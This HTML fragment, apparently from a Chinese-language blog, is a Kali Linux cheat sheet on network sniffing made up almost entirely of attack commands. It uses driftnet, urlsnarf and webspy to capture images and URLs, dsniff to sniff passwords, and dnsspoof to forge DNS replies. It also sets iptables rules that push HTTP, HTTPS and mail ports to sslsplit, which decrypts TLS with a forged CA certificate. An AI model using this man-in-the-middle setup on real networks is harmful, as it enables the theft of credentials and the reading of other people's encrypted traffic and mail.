<span class="line">    网络嗅探</span><br><span class="line"></span><br><span class="line">     # 实时显示图片</span><br><span class="line">     root@kali:~# driftnet -i eth0 </span><br><span class="line">     # -a 不要在屏幕上显示图像，而是将其保存到一个临时目录中，并在标准输出上公布它们的名称。</span><br><span class="line">     # -d 指定目录</span><br><span class="line">     # -s 抓取声音</span><br><span class="line">     root@kali:~# driftnet -i eth0 -a -d testdir -s</span><br><span class="line">     driftnet -i eth1 -a -d /root/tu</span><br><span class="line"></span><br><span class="line">     # 抓取 URL</span><br><span class="line">     root@kali:~# webspy -i eth0 10.10.10.133</span><br><span class="line">     root@kali:~# urlsnarf -i eth0</span><br><span class="line"></span><br><span class="line">     # 嗅探密码</span><br><span class="line">     # -m：自动协议检测</span><br><span class="line">     root@kali:~# dsniff -i eth0 -m</span><br><span class="line">     # 支持的协议类型</span><br><span class="line">     root@kali:~# cat /usr/lib/x86_64-linux-gnu/dsniff.services</span><br><span class="line">     dnsspoof -i eth1 -f  /usr/lib/x86_64-linux-gnu/dnsspoof.hosts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line">netstat -pantu | grep :80</span><br><span class="line">service apache2 start </span><br><span class="line">service apache2 stop </span><br><span class="line">service httpd restart</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443 </span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSA</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3S</span><br><span class="line">iptables -t nat -L</span><br><span class="line"></span><br><span class="line">mkdir -p test/logdir</span><br><span class="line"></span><br><span class="line">sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure>
